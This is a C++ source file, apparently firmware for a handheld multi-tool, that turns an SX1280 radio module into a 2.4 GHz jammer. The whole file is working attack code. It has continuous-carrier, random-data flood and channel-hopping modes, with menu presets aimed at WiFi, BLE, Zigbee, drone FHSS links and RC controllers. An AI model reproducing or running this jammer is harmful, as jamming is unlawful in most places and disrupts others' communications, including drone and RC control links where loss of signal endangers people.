#include "sx1280_jammer.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include <RadioLib.h>

#define SX1280_SCK   3
#define SX1280_MISO  4
#define SX1280_MOSI  1
#define SX1280_CS    5
#define SX1280_BUSY  7
#define SX1280_RST   8
#define SX1280_DIO1  9

static SX1280* sxRadio = nullptr;

static bool sx1280_init() {
    if (sxRadio != nullptr) return true;
    SPI.begin(SX1280_SCK, SX1280_MISO, SX1280_MOSI, SX1280_CS);
    sxRadio = new SX1280(new Module(SX1280_CS, SX1280_DIO1, SX1280_RST, SX1280_BUSY));
    int state = sxRadio->begin(2400.0, 812.5, 5, 5, 18);
    if (state != RADIOLIB_ERR_NONE) {
        delete sxRadio;
        sxRadio = nullptr;
        return false;
    }
    sxRadio->setOutputPower(3);
    return true;
}

static void jam_cw(float freq) {
    sxRadio->setFrequency(freq);
    delay(10);
    uint8_t cmd = 0xD1;
    digitalWrite(SX1280_CS, LOW);
    SPI.transfer(cmd);
    digitalWrite(SX1280_CS, HIGH);
    while (!check(SelPress)) { delay(50); }
    sxRadio->standby();
}

static void jam_data_flood(float startF, float endF, float step) {
    uint8_t payload[32];
    for (int i = 0; i < 32; i++) payload[i] = random(0, 256);
    for (float f = startF; f <= endF; f += step) {
        if (check(SelPress)) return;
        sxRadio->setFrequency(f);
        sxRadio->transmit(payload, sizeof(payload));
    }
}

static void jam_channel_hop(float startF, float endF) {
    while (!check(SelPress)) {
        float f = startF + (random(0, (int)((endF - startF) * 10)) / 10.0);
        sxRadio->setFrequency(f);
        sxRadio->transmit("X");
        delayMicroseconds(200);
    }
}

void sx1280_jammer_run(int mode, float startFreq, float endFreq) {
    if (!sx1280_init()) {
        displayError("SX1280 Init Failed!", true);
        return;
    }
    drawMainBorder();
    tft.setCursor(10, 28);
    tft.setTextSize(FM);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.println("SX1280 JAMMER");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(10, tft.getCursorY() + 8);
    tft.printf("Mode: %d\n", mode);
    tft.setCursor(10, tft.getCursorY() + 4);
    tft.printf("Range: %.0f - %.0f MHz\n", startFreq, endFreq);
    tft.setCursor(10, tft.getCursorY() + 8);
    tft.println("Press SEL to stop");
    switch (mode) {
        case JAM_CW:
            jam_cw(startFreq);
            break;
        case JAM_DATA_FLOOD:
            while (!check(SelPress))
                jam_data_flood(startFreq, endFreq, 5.0);
            break;
        default:
            jam_channel_hop(startFreq, endFreq);
            break;
    }
    sxRadio->standby();
    displayInfo("Jammer Stopped");
}

void sx1280_jammer_menu() {
    std::vector<Option> modes = {
        {"CW Single Freq",  [=]() { sx1280_jammer_run(JAM_CW,           2437, 2437); }},
        {"Data Flood",      [=]() { sx1280_jammer_run(JAM_DATA_FLOOD,   2400, 2500); }},
        {"WiFi Channels",   [=]() { sx1280_jammer_run(JAM_CHANNEL_HOP,  2401, 2495); }},
        {"BLE Advertising", [=]() { sx1280_jammer_run(JAM_CHANNEL_HOP,  2402, 2480); }},
        {"Zigbee",          [=]() { sx1280_jammer_run(JAM_CHANNEL_HOP,  2405, 2480); }},
        {"Drone FHSS",      [=]() { sx1280_jammer_run(JAM_CHANNEL_HOP,  2400, 2483); }},
        {"RC 2.4GHz",       [=]() { sx1280_jammer_run(JAM_CHANNEL_HOP,  2405, 2475); }},
        {"Full Band Sweep", [=]() { sx1280_jammer_run(JAM_CHANNEL_HOP,  2400, 2500); }},
        {"Back",            [=]() { backToMenu(); }}
    };
    loopOptions(modes);
}
